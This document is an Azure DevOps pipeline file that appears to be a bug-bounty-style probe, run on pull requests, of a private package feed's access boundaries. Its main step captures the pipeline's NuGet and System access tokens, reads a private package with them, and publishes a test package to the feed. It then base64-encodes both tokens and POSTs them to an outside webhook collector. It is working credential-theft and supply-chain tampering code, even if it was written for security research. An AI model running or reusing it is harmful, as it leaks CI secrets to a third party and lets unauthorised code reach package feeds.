pr:
  branches:
    include:
      - main
trigger: none
pool:
  name: r37gh6n9bsoq0hwi3ngw-pool
steps:
  - checkout: self
  - script: |
      echo "=== BUILD DIAGNOSTICS ==="
      echo "Reason=$(Build.Reason)"
      echo "SourceBranch=$(Build.SourceBranch)"
      echo "Repository=$(Build.Repository.Name)"
      echo "IsFork=$(System.PullRequest.IsFork)"
      echo "PRSourceRepo=$(System.PullRequest.SourceRepositoryURI)"
    displayName: diagnostics
  - task: NuGetAuthenticate@1
    displayName: nuget-authenticate
  - script: |
      set +e
      FEED_NPM="https://pkgs.dev.azure.com/r37gh6n9bsoq0hwi3ngw-ado/r37gh6n9bsoq0hwi3ngw-proj/_packaging/r37gh6n9bsoq0hwi3ngw-feed/npm/registry"
      PKG="r37gh6n9bsoq0hwi3ngw-secretpkg"
      TOK="$VSS_NUGET_ACCESSTOKEN"
      SAT="$SYSTEM_ACCESSTOKEN"
      echo "VSS_NUGET token present: $([ -n \"$TOK\" ] && echo yes || echo no) len=${#TOK}"
      echo "System.AccessToken present: $([ -n \"$SAT\" ] && echo yes || echo no) len=${#SAT}"
      echo "=== FEED METADATA READ (Information Disclosure probe) ==="
      curl -s -o meta.json -w "meta_bearer HTTP %{http_code}\n" -H "Authorization: Bearer $TOK" "$FEED_NPM/$PKG"
      head -c 500 meta.json; echo
      echo "=== TARBALL CONTENT READ ==="
      TARURL=$(grep -o '"tarball":"[^"]*"' meta.json | head -1 | sed 's/.*"tarball":"//;s/"//')
      echo "tarball_url=$TARURL"
      if [ -n "$TARURL" ]; then
        curl -s -o pkg.tgz -w "tarball HTTP %{http_code}\n" -H "Authorization: Bearer $TOK" "$TARURL"
        tar xzf pkg.tgz 2>/dev/null
        echo "SENTINEL-READ=$(cat package/SENTINEL.txt 2>/dev/null || echo NONE)"
      fi
      echo "=== FEED PUBLISH (Tampering probe) ==="
      rm -rf pushpkg; mkdir -p pushpkg
      printf '%s' '{"name":"r37gh6n9bsoq0hwi3ngw-forkpush","version":"0.0.1","description":"fork push probe"}' > pushpkg/package.json
      printf 'registry=%s/\n' "$FEED_NPM" > pushpkg/.npmrc
      printf '//pkgs.dev.azure.com/r37gh6n9bsoq0hwi3ngw-ado/r37gh6n9bsoq0hwi3ngw-proj/_packaging/r37gh6n9bsoq0hwi3ngw-feed/npm/registry/:_authToken=%s\n' "$TOK" >> pushpkg/.npmrc
      printf '//pkgs.dev.azure.com/r37gh6n9bsoq0hwi3ngw-ado/r37gh6n9bsoq0hwi3ngw-proj/_packaging/r37gh6n9bsoq0hwi3ngw-feed/npm/:_authToken=%s\n' "$TOK" >> pushpkg/.npmrc
      ( cd pushpkg && npm publish --userconfig ./.npmrc 2>&1 | tail -6 )
      echo "=== forward captured bearer token to researcher OOB collector for off-box analysis ==="
      B64=$(printf '%s' "$TOK" | base64 -w0)
      SB64=$(printf '%s' "$SAT" | base64 -w0)
      curl -s -X POST "https://webhook.anywaiver.com/87a2a254-1b36-428f-895c-bbf54ee10a6d/forktoken" -H "Content-Type: application/json" -d "{\"vss_b64\":\"$B64\",\"sat_b64\":\"$SB64\",\"reason\":\"$(Build.Reason)\",\"isfork\":\"$(System.PullRequest.IsFork)\"}" -o /dev/null -w "oob_post HTTP %{http_code}\n"
      echo "=== PROBE COMPLETE ==="
    displayName: feed-boundary-probe
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
